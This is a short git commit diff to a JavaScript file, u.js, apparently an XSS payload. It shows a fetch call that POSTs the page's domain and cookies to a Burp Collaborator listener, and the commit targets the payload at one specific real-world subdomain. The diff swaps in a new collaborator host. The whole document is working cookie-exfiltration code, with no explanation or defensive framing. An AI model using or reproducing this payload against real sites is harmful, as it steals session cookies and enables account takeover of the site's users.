6791f88223554b65dbbd198b073a98d2e318bb59
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2023-02-28 12:03:30 +0330

    Update u.js

--- u.js
+++ u.js
@@ -1,5 +1,7 @@
-fetch('https://tnk67ndtbzdnlafionw5v1xqehk88x.burpcollaborator.net', {
+if(document.domain=="cruise-with-points.marriott.com"){
+fetch('https://yegflg83ky3tegfwqh7edz87lyrofd.burpcollaborator.net', {
 method: 'POST',
 mode: 'no-cors',
 body:document.domain+document.cookie
 });
+}
